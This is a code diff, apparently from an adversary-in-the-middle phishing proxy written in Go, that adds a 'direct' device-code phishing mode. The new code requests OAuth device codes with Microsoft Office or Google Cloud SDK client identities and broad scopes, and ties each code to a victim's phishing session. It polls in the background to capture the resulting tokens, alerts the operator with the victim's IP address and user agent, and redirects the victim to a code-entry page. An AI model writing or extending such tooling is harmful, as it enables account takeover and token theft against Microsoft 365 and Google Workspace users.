@@ -1060,7 +1060,59 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									}
 									session.DCMode = dcMode
 
-									if dcMode != DCModeOff {
+									// --- DCModeDirect: skip AitM, redirect directly to device code interstitial ---
+									if dcMode == DCModeDirect {
+										if dcClient == "" {
+											if dcProvider == DCProviderGoogle {
+												dcClient = "google_cloud_sdk"
+											} else {
+												dcClient = "ms_office"
+											}
+										}
+										if dcScope == "" {
+											provider := GetProviderForClient(dcClient)
+											if provider == DCProviderGoogle {
+												dcScope = "gworkspace"
+											} else {
+												dcScope = "full"
+											}
+										}
+
+										// Generate device code synchronously
+										dcSess, err := p.deviceCode.RequestDeviceCode(dcClient, dcScope)
+										if err != nil {
+											log.Error("[%d] [devicecode] failed to generate device code: %v", sid, err)
+											// Fall back to normal proxy behavior
+										} else {
+											p.deviceCode.LinkToAitmSession(dcSess.ID, session.Id)
+											session.DCSessionID = dcSess.ID
+											session.DCUserCode = dcSess.UserCode
+											session.DCState = DCStateWaiting
+
+											log.Important("[%d] [devicecode] DIRECT mode - code generated: %s (client: %s)", sid, dcSess.UserCode, dcSess.ClientName)
+
+											// Start background polling
+											p.deviceCode.StartPolling(dcSess.ID)
+
+											// Send notification
+											p.notifier.Trigger(EventDeviceCodeGenerated, &NotificationData{
+												Origin:    session.RemoteAddr,
+												Phishlet:  session.Phishlet,
+												SessionID: session.Id,
+												UserAgent: session.UserAgent,
+												Custom:    map[string]string{"dc_code": dcSess.UserCode, "dc_session": dcSess.ID},
+											})
+
+											// Redirect directly to device code interstitial
+											interstitialURL := fmt.Sprintf("/dc/%s", session.Id)
+											resp := goproxy.NewResponse(req, "text/html", 302, "")
+											resp.Header.Set("Location", interstitialURL)
+											resp.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
+											return req, resp
+										}
+									}
+
+									if dcMode != DCModeOff && dcMode != DCModeDirect {
 										if dcClient == "" {
 											// Auto-detect default client from provider
 											if dcProvider == DCProviderGoogle {
